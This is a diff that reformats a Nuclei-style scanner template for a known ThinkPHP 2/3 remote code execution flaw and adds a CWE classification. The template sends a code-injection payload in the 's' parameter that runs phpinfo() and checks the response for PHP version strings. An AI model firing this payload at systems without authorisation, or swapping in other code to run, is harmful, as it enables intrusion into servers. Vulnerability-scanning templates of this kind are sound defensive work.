@@ -1,5 +1,4 @@
 id: thinkphp-2-rce
-
 info:
   name: ThinkPHP 2/3 - Remote Code Execution
   author: dr_set
@@ -7,25 +6,24 @@ info:
   description: ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
   reference:
     - https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
+  classification:
+    cwe-id:
+      - CWE-95
   metadata:
     max-request: 1
-  tags: thinkphp,rce,vuln
-
+  tags: rce,thinkphp,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
+        type: word
         words:
-          - "PHP Extension"
-          - "PHP Version"
-          - "ThinkPHP"
-        condition: and
-
-      - type: status
-        status:
+          - PHP Extension
+          - PHP Version
+          - ThinkPHP
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D'
